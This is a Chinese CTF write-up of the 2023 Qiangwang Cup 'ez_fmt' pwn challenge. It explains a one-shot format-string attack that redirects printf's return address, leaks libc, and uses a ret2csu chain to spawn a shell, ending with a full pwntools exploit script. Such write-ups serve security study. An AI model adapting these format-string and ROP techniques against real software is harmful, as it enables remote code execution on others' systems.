# 2023强网杯Pwn-WP


这里只补一道Pwn，就是强网先锋的ez_fmt。这题可以说非常可惜，在最后半小时想到正确的思路，可是没时间写完了。当然，这题的设限其实非常多。先不谈只能一次fmt的问题，光是0x30的读入大小就非常恶心了。因为如此小的读入让人直觉上不可能去构造ROP，而是往one_gadget的方向想。可是对于一个6字节的64位地址，3次hn写入再加上3个8Byte的地址填充早就超过0x30的大小了。因此，利用gadgets构造ROP才是真正的解法。

## ez_fmt

题目如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("There is a gift for you %p\n", buf);
  read(0, buf, 0x30uLL);
  if ( w == 0xFFFF )
  {
    printf(buf);
    w = 0;
  }
  return 0;
}
```

除了PIE保护全开。

首先要明白的一点是，只要w被修改为0，我们永远没有办法再次修改w。因为修改完w后，程序的唯一漏洞点就无法被访问了。因此，我们必须在修改w之前就改变程序运行流程，让其再次执行printf（显然一次fmt不可能利用）。

于是就只能劫持第二个printf的return address，这样w就修改不到了。具体的地址就是`leak addr - 0x8`。当然此时payload空间还有剩余，我们需要将libc地址一起泄露。

```python
payload = "%{}c%10$hn".format(0x10b0).encode()
payload += "%{}c%11$hn".format(0xffff-0x10b0).encode()
payload += "%19$p".encode()
payload = payload.ljust(0x20,b"a")
payload += p64(stack_addr-0x8)
payload += p64(0x404010)
p.recv()
p.send(payload)
```

这里返回地址可以改为很多，比如改为_start或者直接改到main。但是改到main的时候需要注意栈对齐的问题。

接着第二次printf就可以使用ret2csu构造system('/bin/sh')。这里需要注意由于printf的fmtstr还在栈上，需要多pop几次将前面脏数据先pop掉，接着直接放入/bin/sh和system即可。

```python
payload = "%{}c%8$hn".format(0x12ce).encode()
payload = payload.ljust(0x10,b"a")
payload += p64(stack_addr-0x8 - 0x150)  
payload += p64(0x00000000004012d3)
payload += p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + 0x51cd0 + 0x2)
```

![getshell](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231219172342054.png)

还是经验太少，利用手段太单一，不能灵活使用。exploit如下：

```python
from pwn import*
# context.log_level = "debug"
elf = ELF("./ez_fmt")
context.terminal=['tmux','splitw','-h']
libc = elf.libc
p = process("./ez_fmt")
# p = remote("47.104.24.40",1337)
p.recvuntil("0x")
stack_addr = int(p.recv(12),16)
print(hex(stack_addr))
payload = "%{}c%10$hn".format(0x10b0).encode()
payload += "%{}c%11$hn".format(0xffff-0x10b0).encode()
payload += "%19$p".encode()
payload = payload.ljust(0x20,b"a")
payload += p64(stack_addr-0x8)
payload += p64(0x404010)
p.recv()
p.send(payload)
p.recvuntil("0x")
libc_base = int(p.recv(12),16) - libc.sym["__libc_start_main"] - 243
print(hex(libc_base))
"""
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""
one_gadget = libc_base + 0xe3afe
payload = "%{}c%8$hn".format(0x12ce).encode()
payload = payload.ljust(0x10,b"a")
payload += p64(stack_addr-0x8 - 0x150)  
payload += p64(0x00000000004012d3)
payload += p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + 0x51cd0 + 0x2)
p.recv()
p.send(payload)

p.interactive()
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/12/qwb2023pwn/  

